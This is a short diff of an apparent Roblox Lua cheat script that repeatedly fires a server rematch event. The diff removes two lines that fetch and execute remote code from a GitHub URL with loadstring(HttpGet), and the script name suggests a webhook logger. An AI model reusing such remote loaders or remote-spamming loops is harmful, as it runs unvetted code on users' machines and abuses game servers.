@@ -16,8 +16,6 @@ if game.PlaceId == 15144787112 then
 				end
 			end
 		end
-
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/bbwebhookforork.lua"))()
 	else
 		while wait(0.1) do
 			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_net@0.1.0").net:FindFirstChild("RE/PlayerWantsRematch"):FireServer()
@@ -62,8 +60,6 @@ elseif game.PlaceId == 13772394625 then
 				end
 			end
 		end
-
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/bbwebhookforork.lua"))()
 
 	else
 
